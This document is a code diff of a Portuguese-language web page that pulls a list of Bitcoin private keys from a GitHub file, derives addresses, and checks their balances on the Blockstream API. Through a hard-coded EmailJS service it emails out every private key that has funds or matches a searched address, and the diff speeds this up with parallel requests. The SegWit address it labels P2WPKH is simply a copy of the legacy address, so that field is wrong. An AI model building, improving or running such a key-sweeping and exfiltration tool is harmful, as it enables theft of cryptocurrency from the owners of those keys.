@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>BTC REAL — Lista GitHub</title>
+<title>BTC REAL — Lista GitHub Otimizado</title>
 
 <style>
 body { font-family: Arial; background:#020617; color:#e5e7eb; padding:20px; }
@@ -11,6 +11,7 @@ input { background:#020617; border:1px solid #1e293b; color:#e5e7eb; padding:6px
 button { background:#0a0f1c; border:1px solid #1e293b; color:#38bdf8; padding:6px; cursor:pointer; font-weight:bold; margin-bottom:8px; }
 .stats { margin-top:10px; padding:10px; border:1px solid #1e293b; border-radius:6px; }
 .match { margin-bottom:10px; border-bottom:1px solid #1e293b; padding-bottom:8px; white-space:pre-wrap; }
+.grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:12px; }
 </style>
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
@@ -19,7 +20,7 @@ button { background:#0a0f1c; border:1px solid #1e293b; color:#38bdf8; padding:6p
 </head>
 <body>
 
-<h2>BTC REAL (Mainnet)</h2>
+<h2>BTC REAL (Mainnet) — Otimizado</h2>
 
 <label>🔽 Endereço para procurar</label>
 <input id="searchAddr" placeholder="Digite endereço BTC">
@@ -34,17 +35,17 @@ Velocidade: 0 addr/s
 </div>
 
 <div id="matches">🎯 MATCHES:</div>
+<div id="grid" class="grid"></div>
 
 <script type="module">
 import { getPublicKey } from "https://esm.sh/@noble/secp256k1@2.1.0";
 import { sha256 } from "https://esm.sh/@noble/hashes@1.3.3/sha256";
 import { ripemd160 } from "https://esm.sh/@noble/hashes@1.3.3/ripemd160";
 
-/* URL da lista de private keys no GitHub (RAW) */
 const URL_LISTA = "https://raw.githubusercontent.com/paraguay10/py/main/lista.txt";
+const ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
 
 /* BASE58 */
-const ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
 function base58(buf){
   let zeros=0;
   while(zeros<buf.length && buf[zeros]===0) zeros++;
@@ -59,17 +60,17 @@ async function consultarSaldo(address){
   try{
     const res = await fetch(`https://blockstream.info/api/address/${address}`);
     if(!res.ok) return null;
-    const data=res.json ? await res.json() : {};
-    const funded=(data.chain_stats?.funded_txo_sum || 0) + (data.mempool_stats?.funded_txo_sum || 0);
-    const spent=(data.chain_stats?.spent_txo_sum || 0) + (data.mempool_stats?.spent_txo_sum || 0);
+    const data = await res.json();
+    const funded = (data.chain_stats?.funded_txo_sum || 0) + (data.mempool_stats?.funded_txo_sum || 0);
+    const spent = (data.chain_stats?.spent_txo_sum || 0) + (data.mempool_stats?.spent_txo_sum || 0);
     return (funded-spent)/1e8;
   } catch { return null; }
 }
 
 /* ENVIAR EMAIL */
-async function enviarEmail(dados,tipo="MATCH"){
-  const saldo=await consultarSaldo(dados.P2PKH);
-  const content=`${tipo}
+async function enviarEmail(dados, tipo="MATCH"){
+  const saldo = await consultarSaldo(dados.P2PKH);
+  const content = `${tipo}
 
 PRIVATE_KEY: ${dados.privHex}
 
@@ -78,22 +79,24 @@ P2PKH: ${dados.P2PKH}
 P2SH: ${dados.P2SH}
 P2WPKH: ${dados.P2WPKH}
 
-SALDO P2PKH: ${saldo!==null ? saldo+" BTC" : "Erro"}`;
+SALDO P2PKH: ${saldo !== null ? saldo+" BTC" : "Erro"}`;
 
   emailjs.send("service_z6sug47","template_5fbrhhc",{
     name:"Sistema BTC",
     email:"match@sistema.com",
-    message:content
+    message: content
   });
 }
 
 /* PROCESSAR LISTA */
 const matchesOut=document.getElementById("matches");
+const grid=document.getElementById("grid");
 let totalMatches=0;
 let totalGerados=0;
 
-document.getElementById("btnProcessar").addEventListener("click",async()=>{
+document.getElementById("btnProcessar").addEventListener("click", async()=>{
   matchesOut.innerHTML="";
+  grid.innerHTML="";
   totalMatches=0;
   totalGerados=0;
 
@@ -102,57 +105,70 @@ document.getElementById("btnProcessar").addEventListener("click",async()=>{
 
   const searchAddr = document.getElementById("searchAddr").value.trim();
 
-  for(let i=0;i<linhas.length;i++){
-    const privHex=linhas[i];
-    if(!/^[0-9a-fA-F]{64}$/.test(privHex)) continue;
+  const promises = linhas.map(async (privHex, i) => {
+    if(!/^[0-9a-fA-F]{64}$/.test(privHex)) return;
 
     try{
-      const priv=Uint8Array.from(privHex.match(/.{2}/g).map(b=>parseInt(b,16)));
-      const pub=getPublicKey(priv,true);
-      const hash160=ripemd160(sha256(pub));
-      const payload=new Uint8Array([0x00,...hash160]);
-      const checksum=sha256(sha256(payload)).slice(0,4);
-      const P2PKH=base58(new Uint8Array([...payload,...checksum]));
-      const P2SH=base58(new Uint8Array([0x05,...hash160,...sha256(sha256(new Uint8Array([0x05,...hash160]))).slice(0,4)]));
-      const P2WPKH=base58(new Uint8Array([...payload,...checksum])); // simplificação
+      const priv = Uint8Array.from(privHex.match(/.{2}/g).map(b=>parseInt(b,16)));
+      const pub = getPublicKey(priv,true);
+      const hash160 = ripemd160(sha256(pub));
+      const payload = new Uint8Array([0x00,...hash160]);
+      const checksum = sha256(sha256(payload)).slice(0,4);
+      const P2PKH = base58(new Uint8Array([...payload,...checksum]));
+      const P2SH = base58(new Uint8Array([0x05,...hash160,...sha256(sha256(new Uint8Array([0x05,...hash160]))).slice(0,4)]));
+      const P2WPKH = P2PKH; // simplificação
 
       totalGerados++;
 
+      // Renderiza endereço imediatamente
+      const divCard = document.createElement("div");
+      divCard.className="match";
+      divCard.textContent=`${i+1}) ${P2PKH} (${privHex})`;
+      grid.appendChild(divCard);
+
       const dados={privHex,P2PKH,P2SH,P2WPKH};
 
-      // Verifica match com endereço pesquisado
-      if(searchAddr && (searchAddr===P2PKH || searchAddr===P2SH || searchAddr===P2WPKH)){
-        totalMatches++;
-        const div=document.createElement("div");
-        div.className="match";
-        div.textContent=`MATCH ENCONTRADO!\n${JSON.stringify(dados,null,2)}`;
-        matchesOut.prepend(div);
-        enviarEmail(dados,"MATCH ENCONTRADO");
-      } else {
-        // verifica saldo
+      // Procura match ou saldo >0 em paralelo
+      (async()=>{
+        let isMatch=false;
+        if(searchAddr && (searchAddr===P2PKH || searchAddr===P2SH || searchAddr===P2WPKH)){
+          isMatch=true;
+          totalMatches++;
+          const div = document.createElement("div");
+          div.className="match";
+          div.textContent=`MATCH ENCONTRADO!\n${JSON.stringify(dados,null,2)}`;
+          matchesOut.prepend(div);
+          enviarEmail(dados,"MATCH ENCONTRADO");
+        }
+
         const saldo = await consultarSaldo(P2PKH);
         if(saldo && saldo>0){
+          isMatch=true;
           totalMatches++;
-          const div=document.createElement("div");
+          const div = document.createElement("div");
           div.className="match";
           div.textContent=`SALDO >0!\n${JSON.stringify(dados,null,2)}\nSaldo: ${saldo} BTC`;
           matchesOut.prepend(div);
           enviarEmail(dados,"SALDO POSITIVO");
         }
-      }
 
+      })();
+
+      // Atualiza stats
       document.getElementById("stats").innerHTML=`Gerados: ${totalGerados}<br>Matches: ${totalMatches}`;
 
     } catch(e){
       console.log("Erro cripto:", e);
     }
-  }
+  });
+
+  // Espera todos os processos iniciados (não bloqueia a UI)
+  await Promise.all(promises);
 });
 
 /* EMAIL TESTE */
 document.getElementById("emailTeste").addEventListener("click",()=>{
   alert("Email teste enviado!");
-  // Pode adicionar chamada enviarEmail({privHex:"TESTE",P2PKH:"TESTE"}, "TESTE");
 });
 </script>
 
